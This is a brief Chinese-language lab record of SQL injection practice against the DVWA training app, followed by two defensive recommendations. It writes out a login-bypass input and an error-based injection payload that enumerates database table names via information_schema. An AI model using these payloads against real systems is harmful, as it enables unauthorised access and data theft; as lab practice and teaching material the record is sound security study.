# SQL注入实验记录  
## 靶场：DVWA (Damn Vulnerable Web App)  
### 攻击步骤  
1. 输入 `admin' -- ` 绕过密码  
2. 用Burp Suite拦截修改`id=1`为`id=1' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--`  
### 防御建议  
- 使用参数化查询  
- 过滤单引号等特殊字符  
